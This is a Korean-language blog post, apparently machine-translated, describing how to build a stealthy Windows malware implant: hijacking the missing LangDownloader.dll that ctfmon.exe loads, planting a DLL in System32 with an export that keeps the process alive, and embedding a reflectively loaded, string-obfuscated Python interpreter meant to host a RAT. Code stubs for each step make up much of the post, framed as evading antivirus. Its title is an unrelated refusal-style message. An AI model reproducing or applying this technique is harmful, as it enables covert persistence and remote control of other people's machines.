<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><title>제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다 | itposting</title><meta name="description" content=""/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:url" content="https://itposting.github.io///post/2024-06-19-Writemesomemalware" data-gatsby-head="true"/><meta property="og:type" content="website" data-gatsby-head="true"/><meta property="og:site_name" content="제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다 | itposting" data-gatsby-head="true"/><meta property="og:title" content="제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다 | itposting" data-gatsby-head="true"/><meta property="og:description" content="" data-gatsby-head="true"/><meta property="og:image" content="/assets/img/2024-06-19-Writemesomemalware_0.png" data-gatsby-head="true"/><meta property="og:locale" content="en_US" data-gatsby-head="true"/><meta name="twitter:card" content="summary_large_image" data-gatsby-head="true"/><meta property="twitter:domain" content="https://itposting.github.io/" data-gatsby-head="true"/><meta property="twitter:url" content="https://itposting.github.io///post/2024-06-19-Writemesomemalware" data-gatsby-head="true"/><meta name="twitter:title" content="제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다 | itposting" data-gatsby-head="true"/><meta name="twitter:description" content="" data-gatsby-head="true"/><meta name="twitter:image" content="/assets/img/2024-06-19-Writemesomemalware_0.png" data-gatsby-head="true"/><meta name="twitter:data1" content="Dev | itposting" data-gatsby-head="true"/><meta name="article:published_time" content="2024-06-19 01:15" data-gatsby-head="true"/><meta name="next-head-count" content="19"/><meta name="google-site-verification" content="a-yehRo3k3xv7fg6LqRaE8jlE42e5wP2bDE_2F849O4"/><link rel="stylesheet" href="/favicons/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/assets/favicons/favicon-96x96.png"/><link rel="icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-startup-image" href="/startup.png"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="msapplication-config" content="/favicons/browserconfig.xml"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-23YXDLKDCL"></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
          
            gtag('config', 'G-23YXDLKDCL');</script><link rel="preload" href="/_next/static/css/6e57edcf9f2ce551.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e57edcf9f2ce551.css" data-n-g=""/><link rel="preload" href="/_next/static/css/b8ef307c9aee1e34.css" as="style"/><link rel="stylesheet" href="/_next/static/css/b8ef307c9aee1e34.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-ee6df16fdc6dae4d.js" defer=""></script><script src="/_next/static/chunks/framework-46611630e39cfdeb.js" defer=""></script><script src="/_next/static/chunks/main-cf4a52eec9a970a0.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6fae11262ee5c69b.js" defer=""></script><script src="/_next/static/chunks/75fc9c18-ac4aa08aae62f90e.js" defer=""></script><script src="/_next/static/chunks/463-0429087d4c0b0335.js" defer=""></script><script src="/_next/static/chunks/pages/post/%5Bslug%5D-d849684d6d83f07a.js" defer=""></script><script src="/_next/static/CYQjEY3HhSkRTiL0gewc0/_buildManifest.js" defer=""></script><script src="/_next/static/CYQjEY3HhSkRTiL0gewc0/_ssgManifest.js" defer=""></script></head><body><div id="__next"><header class="Header_header__Z8PUO"><div class="Header_inner__tfr0u"><strong class="Header_title__Otn70"><a href="/">IT Posting</a></strong><nav class="Header_nav_area__6KVpk"><a class="nav_item" href="/posts/1">Posts</a></nav></div></header><main class="posts_container__NyRU3"><div class="posts_inner__i3n_i"><h1 class="posts_post_title__EbxNx">제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다</h1><div class="posts_meta__cR7lu"><div class="posts_profile_wrap__mslMl"><div class="posts_profile_image_wrap__kPikV"><img alt="제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다" loading="lazy" width="44" height="44" decoding="async" data-nimg="1" class="profile" style="color:transparent" src="/favicons/apple-icon-114x114.png"/></div><div class="posts_textarea__w_iKT"><span class="writer">IT Posting</span><span class="posts_info__5KJdN"><span class="posts_date__ctqHI">Posted On Jun 19, 2024</span><span class="posts_reading_time__f7YPP">6<!-- --> min read</span></span></div></div><img alt="" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" class="posts_view_badge__tcbfm" style="color:transparent" src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fallround-coder.github.io/post/2024-06-19-Writemesomemalware&amp;count_bg=%2379C83D&amp;title_bg=%23555555&amp;icon=&amp;icon_color=%23E7E7E7&amp;title=views&amp;edge_flat=false"/></div><article class="posts_post_content__n_L6j"><div><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1" name="viewport">
</head>
<body>
<p>(연구 목적으로만 사용)</p>
<h1>이루고 싶은 것:</h1>
<h1>어떻게 로드할 것인가:</h1>
<p>Windows에는 ctfmon.exe라는 멋진 프로세스가 있습니다. 이 프로세스를 좋아하는 이유가 몇 가지 있어요.</p>
<div class="content-ad"></div>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_0.png" alt="이미지"></p>
<ul>
<li>높은 권한에서 실행됩니다.</li>
<li>충돌/중단 시 다시 시작하는 서비스가 있습니다.</li>
<li>모든 Windows 컴퓨터에서 실행됩니다.</li>
</ul>
<div class="content-ad"></div>
<p>해당 프로세스 내에서 실행하고 싶긴 한데, 어떻게 해야할지가 문제야.</p>
<p>"virtual alloc — create remote thread" 방법으로 내 자신을 주입할 수 있지만, 안티바이러스들이 이미 알고 있고 그 방법은 너무 2012년식이야. 더 나은 방법을 고민해봐야겠어.</p>
<h2>ctfmon.exe에 로드하는 멋진 방법 찾기</h2>
<p>Procmon을 실행하고 ctfmon.exe를 다시 시작해서 무슨 일을 하는지 확인해봐.</p>
<div class="content-ad"></div>
<img src="/assets/img/2024-06-19-Writemesomemalware_1.png">
<p>음... ctfmon.exe이 LangDownloader.dll이라는 동적 라이브러리를 로드하려고 하는 것 같지만 찾을 수 없네요. 제 컴퓨터에 있는지 확인해보겠습니다.</p>
<img src="/assets/img/2024-06-19-Writemesomemalware_2.png">
<p>LangDownloader.dll이 없습니다... 하나 만들어 시스템32에 넣어 ctfmon.exe를 다시 시작해보겠습니다.</p>
<div class="content-ad"></div>
<pre><code class="hljs language-js"><span class="hljs-variable constant_">BOOL</span> <span class="hljs-variable constant_">APIENTRY</span> <span class="hljs-title class_">DllMain</span>(<span class="hljs-variable constant_">HMODULE</span> hModule,
    <span class="hljs-variable constant_">DWORD</span>  ul_reason_for_call,
    <span class="hljs-variable constant_">LPVOID</span> lpReserved
)
{
    <span class="hljs-keyword">switch</span> (ul_reason_for_call)
    {

    <span class="hljs-keyword">case</span> <span class="hljs-attr">DLL_PROCESS_ATTACH</span>:
        {
        <span class="hljs-title class_">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-attr">std</span>::<span class="hljs-title function_">to_string</span>(<span class="hljs-title class_">GetCurrentProcessId</span>()).<span class="hljs-title function_">c_str</span>(), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        <span class="hljs-keyword">break</span>;
        }
    <span class="hljs-keyword">case</span> <span class="hljs-attr">DLL_THREAD_ATTACH</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-attr">DLL_THREAD_DETACH</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-attr">DLL_PROCESS_DETACH</span>:
        <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">TRUE</span>;
}
</code></pre>
<p>메시지 상자를 표시하지만 ctfmon.exe가 종료됩니다. 무언가 잘못하고 있는 것 같아요 :(</p>
<p>LangDownloader.dll이 어떻게 로드되는지 자세히 파악하여 더 나은 모방을 하고 충돌을 방지하고 싶어요. ctfmon.exe를 좀 더 자세히 살펴보는 것이 가장 좋은 방법인 것 같아요.</p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_3.png" alt="이미지"></p>
<div class="content-ad"></div>
<p>이 static imports만 있는 것을 볼 수 있습니다. LangDownloader.dll은 여기 없는데요... 어디서 불러오는 걸까요?</p>
<p>Procmon으로 돌아가보면 무언가를 발견할 수도 있을 거에요</p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_4.png" alt="image"></p>
<p>여기 보세요. InputLocaleManager.dll을 불러오고 있네요. 이 파일을 조사해봅시다.</p>
<div class="content-ad"></div>
<p>해당 문자열을 찾았습니다!</p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_5.png" alt="image"></p>
<p>여기서 잘 로드되고 있네요. 이제 뭘 할까요?</p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_6.png" alt="image"></p>
<div class="content-ad"></div>
<p>한번 확대해볼까요? 저희에게 pdb 파일이 있어요 (:</p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_7.png" alt="image 1"></p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_8.png" alt="image 2"></p>
<p>이 코드를 한 번 분석해 봐요.</p>
<div class="content-ad"></div>
<pre><code class="hljs language-js">• <span class="hljs-title class_">LangDownloader</span>.<span class="hljs-property">dll</span>을로드하려고 시도합니다.
• 실패하는 경우
  - “종료”로 계속 진행합니다.
• 성공하는 경우
  - <span class="hljs-title class_">LangDownloaderCreate</span>의 주소를 가져오려고 시도합니다.
  - 실패하는 경우
     프로세스 종료
  - 성공하는 경우
     매개변수와 함께 <span class="hljs-title class_">LangDownloaderCreate</span>를 호출합니다
</code></pre>
<p>지금까지 잘 됐어요. 이것은 왜 ctfmon.exe가 실행할 LangDownloader.dll이라는 임의의 .dll을 제공했을 때 충돌했는지를 설명합니다.</p>
<img src="/assets/img/2024-06-19-Writemesomemalware_9.png">
<p>우리는 0보다 작고 0x800700E와 다른 숫자를 반환하면 우리는 그냥 계속 진행할 것임을 볼 수 있습니다... 내가 신경 쓰지 않으니까 무한 대기를 해봅시다.</p>
<div class="content-ad"></div>
<pre><code class="hljs language-js">extern <span class="hljs-string">"C"</span> <span class="hljs-title function_">__declspec</span>(dllexport) int <span class="hljs-title class_">LangDownloaderCreate</span>(int a, int b)
{
    <span class="hljs-comment">// 영원히 기다려요</span>
    <span class="hljs-variable constant_">HANDLE</span> never_set = <span class="hljs-title class_">CreateEventA</span>(<span class="hljs-variable constant_">NULL</span>, <span class="hljs-variable constant_">TRUE</span>, <span class="hljs-variable constant_">FALSE</span>, <span class="hljs-variable constant_">NULL</span>);
    <span class="hljs-title class_">WaitForSingleObject</span>(never_set, <span class="hljs-variable constant_">INFINITE</span>);

    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
}
</code></pre>
<p>알겠어요!</p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_10.png" alt="이미지"></p>
<p>이제 실행 중이니까... 뭘 하고 싶어요?</p>
<div class="content-ad"></div>
<h1>무엇을 실행할까요:</h1>
<p>제 .dll 내부에 인터프리터를 실행하고 싶어요... 파이썬이 어떻게 하는지 살펴봐요</p>
<p>배운 바에 의하면, 파이썬은 python<code>버전</code>.dll을 사용해서 모든 파이썬 작업을 처리해요</p>
<p>이 .dll을 멋지게 C++ 인터페이스로 감싸봐요</p>
<div class="content-ad"></div>
<pre><code class="hljs language-js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PythonInterpreter</span>
{
<span class="hljs-attr">public</span>:
    explicit <span class="hljs-title class_">PythonInterpreter</span>();
    ~<span class="hljs-title class_">PythonInterpreter</span>();

    <span class="hljs-variable constant_">NO_DISCARD</span> <span class="hljs-keyword">void</span>* <span class="hljs-title function_">run_line</span>(<span class="hljs-keyword">const</span> <span class="hljs-attr">std</span>::string&#x26; line);

    <span class="hljs-comment">// Deleted Functions</span>
    <span class="hljs-title class_">PythonInterpreter</span>(<span class="hljs-keyword">const</span> <span class="hljs-title class_">PythonInterpreter</span>&#x26; other) = <span class="hljs-keyword">delete</span>;
    <span class="hljs-title class_">PythonInterpreter</span>(<span class="hljs-title class_">PythonInterpreter</span>&#x26;&#x26; other) = <span class="hljs-keyword">delete</span>;
    <span class="hljs-title class_">PythonInterpreter</span>&#x26; operator=(<span class="hljs-keyword">const</span> <span class="hljs-title class_">PythonInterpreter</span>&#x26; other) = <span class="hljs-keyword">delete</span>;
    <span class="hljs-title class_">PythonInterpreter</span>&#x26; operator=(<span class="hljs-title class_">PythonInterpreter</span>&#x26;&#x26; other) = <span class="hljs-keyword">delete</span>;

<span class="hljs-attr">private</span>:
    using <span class="hljs-title class_">PyObject</span> = int;

    using <span class="hljs-title class_">PyInitializeType</span> = <span class="hljs-keyword">void</span> (*)();
    using <span class="hljs-title class_">PyFinalizeType</span> = <span class="hljs-keyword">void</span> (*)();
    using <span class="hljs-title class_">PyRunSimpleStringType</span> = <span class="hljs-title class_">PyObject</span> * (*)(<span class="hljs-keyword">const</span> char* str);

    <span class="hljs-comment">// Members</span>
    <span class="hljs-title class_">DynamicLibrary</span> m_python_interpreter_library;
    <span class="hljs-title class_">PyInitializeType</span> m_initialize;
    <span class="hljs-title class_">PyFinalizeType</span> m_finalize;
    <span class="hljs-title class_">PyRunSimpleStringType</span> m_run_simple_string;
};

<span class="hljs-title class_">PythonInterpreter</span>::<span class="hljs-title class_">PythonInterpreter</span>() :
    <span class="hljs-title function_">m_python_interpreter_library</span>(<span class="hljs-title class_">WindowsResource</span>::<span class="hljs-title function_">get_resource</span>(<span class="hljs-title class_">GetModuleHandleA</span>(<span class="hljs-title function_">OBFUSCATE</span>(<span class="hljs-string">"LangDownloader.dll"</span>)),
                                                               <span class="hljs-variable constant_">IDR_BINARY1</span>,
                                                               <span class="hljs-title function_">OBFUSCATE</span>(<span class="hljs-string">"Binary"</span>))),
    <span class="hljs-title function_">m_initialize</span>(static_cast&#x3C;<span class="hljs-title class_">PyInitializeType</span>>(m_python_interpreter_library.<span class="hljs-title function_">get_function</span>(<span class="hljs-title function_">OBFUSCATE</span>(<span class="hljs-string">"Py_Initialize"</span>)))),
    <span class="hljs-title function_">m_finalize</span>(static_cast&#x3C;<span class="hljs-title class_">PyFinalizeType</span>>(m_python_interpreter_library.<span class="hljs-title function_">get_function</span>(<span class="hljs-title function_">OBFUSCATE</span>(<span class="hljs-string">"Py_Finalize"</span>)))),
    <span class="hljs-title function_">m_run_simple_string</span>(static_cast&#x3C;<span class="hljs-title class_">PyRunSimpleStringType</span>>(m_python_interpreter_library.<span class="hljs-title function_">get_function</span>(<span class="hljs-title function_">OBFUSCATE</span>(<span class="hljs-string">"PyRun_SimpleString"</span>))))
{
    <span class="hljs-title function_">m_initialize</span>();
}
</code></pre>
<p>이제 적절한 파이썬 인터프리터가 준비되어 있으므로, LangDownlder.dll에 통합하여 반사적으로 로드할 수 있습니다.</p>
<p>DynamicLibrary 클래스를 만들어야 합니다.</p>
<pre><code class="hljs language-js"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicLibrary</span>
{
<span class="hljs-attr">public</span>:
    explicit <span class="hljs-title class_">DynamicLibrary</span>(<span class="hljs-title class_">ByteSpan</span> library_binary);
    ~<span class="hljs-title class_">DynamicLibrary</span>();

    <span class="hljs-variable constant_">NO_DISCARD</span> <span class="hljs-keyword">void</span>* <span class="hljs-title function_">get_function</span>(<span class="hljs-keyword">const</span> <span class="hljs-attr">std</span>::string&#x26; function_name);

    <span class="hljs-comment">// Deleted Functions</span>
    <span class="hljs-title class_">DynamicLibrary</span>(<span class="hljs-keyword">const</span> <span class="hljs-title class_">DynamicLibrary</span>&#x26; other) = <span class="hljs-keyword">delete</span>;
    <span class="hljs-title class_">DynamicLibrary</span>(<span class="hljs-title class_">DynamicLibrary</span>&#x26;&#x26; other) = <span class="hljs-keyword">delete</span>;
    <span class="hljs-title class_">DynamicLibrary</span>&#x26; operator=(<span class="hljs-keyword">const</span> <span class="hljs-title class_">DynamicLibrary</span>&#x26; other) = <span class="hljs-keyword">delete</span>;
    <span class="hljs-title class_">DynamicLibrary</span>&#x26; operator=(<span class="hljs-title class_">DynamicLibrary</span>&#x26;&#x26; other) = <span class="hljs-keyword">delete</span>;

<span class="hljs-attr">private</span>:
    <span class="hljs-variable constant_">NO_DISCARD</span> <span class="hljs-keyword">static</span> <span class="hljs-variable constant_">HMEMORYMODULE</span> <span class="hljs-title function_">load_library</span>(<span class="hljs-title class_">ByteSpan</span> library_binary);

    <span class="hljs-comment">// Members</span>
    <span class="hljs-variable constant_">HMEMORYMODULE</span> m_library_base;
};
</code></pre>
<div class="content-ad"></div>
<p>이제 ctfmon.exe 내부에 파이썬 인터프리터가 있습니다!</p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_11.png" alt="이미지"></p>
<p>정말 멋지죠?</p>
<p>이제 남은 일은 파이썬으로 RAT을 작성하는 것뿐입니다.</p>
<div class="content-ad"></div>
<p>미안해요! 전손을 올립니다(:</p>
<p><img src="/assets/img/2024-06-19-Writemesomemalware_12.png" alt="Image"></p>
</body>
</html>
</div></article></div></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"title":"제발 합법적인 방식으로 지식을 확장하거나 온라인 커뮤니티에서 도움을 받아보는 것을 고려해보세요 안전한 온라인 활동이 중요하며 악의적인 목적으로 행동하는 것은 부디 자제해 주세요 함께 안전한 인터넷 환경을 만들어 나갈 수 있기를 바랍니다","description":"","date":"2024-06-19 01:15","slug":"2024-06-19-Writemesomemalware","content":"\n\n(연구 목적으로만 사용)\n\n# 이루고 싶은 것:\n\n# 어떻게 로드할 것인가:\n\nWindows에는 ctfmon.exe라는 멋진 프로세스가 있습니다. 이 프로세스를 좋아하는 이유가 몇 가지 있어요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_0.png)\n\n- 높은 권한에서 실행됩니다.\n- 충돌/중단 시 다시 시작하는 서비스가 있습니다.\n- 모든 Windows 컴퓨터에서 실행됩니다.\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n해당 프로세스 내에서 실행하고 싶긴 한데, 어떻게 해야할지가 문제야.\n\n\"virtual alloc — create remote thread\" 방법으로 내 자신을 주입할 수 있지만, 안티바이러스들이 이미 알고 있고 그 방법은 너무 2012년식이야. 더 나은 방법을 고민해봐야겠어.\n\n## ctfmon.exe에 로드하는 멋진 방법 찾기\n\nProcmon을 실행하고 ctfmon.exe를 다시 시작해서 무슨 일을 하는지 확인해봐.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\n\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_1.png\" /\u003e\n\n음... ctfmon.exe이 LangDownloader.dll이라는 동적 라이브러리를 로드하려고 하는 것 같지만 찾을 수 없네요. 제 컴퓨터에 있는지 확인해보겠습니다.\n\n\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_2.png\" /\u003e\n\nLangDownloader.dll이 없습니다... 하나 만들어 시스템32에 넣어 ctfmon.exe를 다시 시작해보겠습니다.\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n)\n{\n    switch (ul_reason_for_call)\n    {\n\n    case DLL_PROCESS_ATTACH:\n        {\n        MessageBoxA(0, std::to_string(GetCurrentProcessId()).c_str(), 0, 0);\n        break;\n        }\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n```\n\n메시지 상자를 표시하지만 ctfmon.exe가 종료됩니다. 무언가 잘못하고 있는 것 같아요 :(\n\nLangDownloader.dll이 어떻게 로드되는지 자세히 파악하여 더 나은 모방을 하고 충돌을 방지하고 싶어요. ctfmon.exe를 좀 더 자세히 살펴보는 것이 가장 좋은 방법인 것 같아요.\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_3.png)\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n이 static imports만 있는 것을 볼 수 있습니다. LangDownloader.dll은 여기 없는데요... 어디서 불러오는 걸까요?\n\nProcmon으로 돌아가보면 무언가를 발견할 수도 있을 거에요\n\n![image](/assets/img/2024-06-19-Writemesomemalware_4.png)\n\n여기 보세요. InputLocaleManager.dll을 불러오고 있네요. 이 파일을 조사해봅시다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n해당 문자열을 찾았습니다!\n\n![image](/assets/img/2024-06-19-Writemesomemalware_5.png)\n\n여기서 잘 로드되고 있네요. 이제 뭘 할까요?\n\n![image](/assets/img/2024-06-19-Writemesomemalware_6.png)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n한번 확대해볼까요? 저희에게 pdb 파일이 있어요 (:\n\n![image 1](/assets/img/2024-06-19-Writemesomemalware_7.png)\n\n![image 2](/assets/img/2024-06-19-Writemesomemalware_8.png)\n\n이 코드를 한 번 분석해 봐요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n• LangDownloader.dll을로드하려고 시도합니다.\n• 실패하는 경우\n  - “종료”로 계속 진행합니다.\n• 성공하는 경우\n  - LangDownloaderCreate의 주소를 가져오려고 시도합니다.\n  - 실패하는 경우\n     프로세스 종료\n  - 성공하는 경우\n     매개변수와 함께 LangDownloaderCreate를 호출합니다\n```\n\n지금까지 잘 됐어요. 이것은 왜 ctfmon.exe가 실행할 LangDownloader.dll이라는 임의의 .dll을 제공했을 때 충돌했는지를 설명합니다.\n\n\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_9.png\" /\u003e\n\n우리는 0보다 작고 0x800700E와 다른 숫자를 반환하면 우리는 그냥 계속 진행할 것임을 볼 수 있습니다... 내가 신경 쓰지 않으니까 무한 대기를 해봅시다.\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nextern \"C\" __declspec(dllexport) int LangDownloaderCreate(int a, int b)\n{\n    // 영원히 기다려요\n    HANDLE never_set = CreateEventA(NULL, TRUE, FALSE, NULL);\n    WaitForSingleObject(never_set, INFINITE);\n\n    return -1;\n}\n```\n\n알겠어요!\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_10.png)\n\n이제 실행 중이니까... 뭘 하고 싶어요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 무엇을 실행할까요:\n\n제 .dll 내부에 인터프리터를 실행하고 싶어요... 파이썬이 어떻게 하는지 살펴봐요\n\n배운 바에 의하면, 파이썬은 python`버전`.dll을 사용해서 모든 파이썬 작업을 처리해요\n\n이 .dll을 멋지게 C++ 인터페이스로 감싸봐요\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nclass PythonInterpreter\n{\npublic:\n    explicit PythonInterpreter();\n    ~PythonInterpreter();\n\n    NO_DISCARD void* run_line(const std::string\u0026 line);\n\n    // Deleted Functions\n    PythonInterpreter(const PythonInterpreter\u0026 other) = delete;\n    PythonInterpreter(PythonInterpreter\u0026\u0026 other) = delete;\n    PythonInterpreter\u0026 operator=(const PythonInterpreter\u0026 other) = delete;\n    PythonInterpreter\u0026 operator=(PythonInterpreter\u0026\u0026 other) = delete;\n\nprivate:\n    using PyObject = int;\n\n    using PyInitializeType = void (*)();\n    using PyFinalizeType = void (*)();\n    using PyRunSimpleStringType = PyObject * (*)(const char* str);\n\n    // Members\n    DynamicLibrary m_python_interpreter_library;\n    PyInitializeType m_initialize;\n    PyFinalizeType m_finalize;\n    PyRunSimpleStringType m_run_simple_string;\n};\n\nPythonInterpreter::PythonInterpreter() :\n    m_python_interpreter_library(WindowsResource::get_resource(GetModuleHandleA(OBFUSCATE(\"LangDownloader.dll\")),\n                                                               IDR_BINARY1,\n                                                               OBFUSCATE(\"Binary\"))),\n    m_initialize(static_cast\u003cPyInitializeType\u003e(m_python_interpreter_library.get_function(OBFUSCATE(\"Py_Initialize\")))),\n    m_finalize(static_cast\u003cPyFinalizeType\u003e(m_python_interpreter_library.get_function(OBFUSCATE(\"Py_Finalize\")))),\n    m_run_simple_string(static_cast\u003cPyRunSimpleStringType\u003e(m_python_interpreter_library.get_function(OBFUSCATE(\"PyRun_SimpleString\"))))\n{\n    m_initialize();\n}\n```\n\n이제 적절한 파이썬 인터프리터가 준비되어 있으므로, LangDownlder.dll에 통합하여 반사적으로 로드할 수 있습니다.\n\nDynamicLibrary 클래스를 만들어야 합니다.\n\n```js\nclass DynamicLibrary\n{\npublic:\n    explicit DynamicLibrary(ByteSpan library_binary);\n    ~DynamicLibrary();\n\n    NO_DISCARD void* get_function(const std::string\u0026 function_name);\n\n    // Deleted Functions\n    DynamicLibrary(const DynamicLibrary\u0026 other) = delete;\n    DynamicLibrary(DynamicLibrary\u0026\u0026 other) = delete;\n    DynamicLibrary\u0026 operator=(const DynamicLibrary\u0026 other) = delete;\n    DynamicLibrary\u0026 operator=(DynamicLibrary\u0026\u0026 other) = delete;\n\nprivate:\n    NO_DISCARD static HMEMORYMODULE load_library(ByteSpan library_binary);\n\n    // Members\n    HMEMORYMODULE m_library_base;\n};\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n이제 ctfmon.exe 내부에 파이썬 인터프리터가 있습니다!\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_11.png)\n\n정말 멋지죠? \n\n이제 남은 일은 파이썬으로 RAT을 작성하는 것뿐입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n미안해요! 전손을 올립니다(:\n\n![Image](/assets/img/2024-06-19-Writemesomemalware_12.png)","ogImage":{"url":"/assets/img/2024-06-19-Writemesomemalware_0.png"},"coverImage":"/assets/img/2024-06-19-Writemesomemalware_0.png","tag":["Tech"],"readingTime":6},"content":"\u003c!doctype html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n\u003cmeta charset=\"utf-8\"\u003e\n\u003cmeta content=\"width=device-width, initial-scale=1\" name=\"viewport\"\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003cp\u003e(연구 목적으로만 사용)\u003c/p\u003e\n\u003ch1\u003e이루고 싶은 것:\u003c/h1\u003e\n\u003ch1\u003e어떻게 로드할 것인가:\u003c/h1\u003e\n\u003cp\u003eWindows에는 ctfmon.exe라는 멋진 프로세스가 있습니다. 이 프로세스를 좋아하는 이유가 몇 가지 있어요.\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_0.png\" alt=\"이미지\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e높은 권한에서 실행됩니다.\u003c/li\u003e\n\u003cli\u003e충돌/중단 시 다시 시작하는 서비스가 있습니다.\u003c/li\u003e\n\u003cli\u003e모든 Windows 컴퓨터에서 실행됩니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cp\u003e해당 프로세스 내에서 실행하고 싶긴 한데, 어떻게 해야할지가 문제야.\u003c/p\u003e\n\u003cp\u003e\"virtual alloc — create remote thread\" 방법으로 내 자신을 주입할 수 있지만, 안티바이러스들이 이미 알고 있고 그 방법은 너무 2012년식이야. 더 나은 방법을 고민해봐야겠어.\u003c/p\u003e\n\u003ch2\u003ectfmon.exe에 로드하는 멋진 방법 찾기\u003c/h2\u003e\n\u003cp\u003eProcmon을 실행하고 ctfmon.exe를 다시 시작해서 무슨 일을 하는지 확인해봐.\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_1.png\"\u003e\n\u003cp\u003e음... ctfmon.exe이 LangDownloader.dll이라는 동적 라이브러리를 로드하려고 하는 것 같지만 찾을 수 없네요. 제 컴퓨터에 있는지 확인해보겠습니다.\u003c/p\u003e\n\u003cimg 